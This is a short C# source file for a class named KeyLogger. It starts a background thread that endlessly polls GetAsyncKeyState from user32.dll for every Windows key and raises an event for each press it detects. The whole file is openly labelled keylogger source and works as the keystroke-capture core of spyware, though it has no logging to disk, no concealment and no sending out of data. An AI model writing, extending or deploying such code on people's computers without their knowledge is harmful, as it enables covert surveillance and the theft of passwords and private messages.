using System;
using System.Runtime.InteropServices;
using System.Threading;

namespace KeyLogger
{
    public delegate void KeyPressedEventHandler(object sender,System.Windows.Forms.Keys key);

    class KeyLogger:IDisposable
    {
        [DllImport("user32.dll")]
        private static extern bool GetAsyncKeyState(System.Windows.Forms.Keys key);


        public event KeyPressedEventHandler KeyPressed;
        private readonly Thread _TheThread;

        public KeyLogger()
        {
            _TheThread = new Thread(Run);
        }

        public void RunAsync()
        {
            _TheThread.Start();
        }

        private void Run()
        {
            while (true)
            {
                foreach (System.Windows.Forms.Keys sampleKey in Enum.GetValues(typeof(System.Windows.Forms.Keys)))
                {
                    if (GetAsyncKeyState(sampleKey))
                    {
                        OnKeyPressed(sampleKey);
                        Thread.Sleep(150);
                    }
                }
            }
        }

        protected virtual void OnKeyPressed(System.Windows.Forms.Keys key)
        {
            if (KeyPressed != null)
                KeyPressed(this, key);
        }

        public void Dispose()
        {
            _TheThread.Abort();
        }
    }
}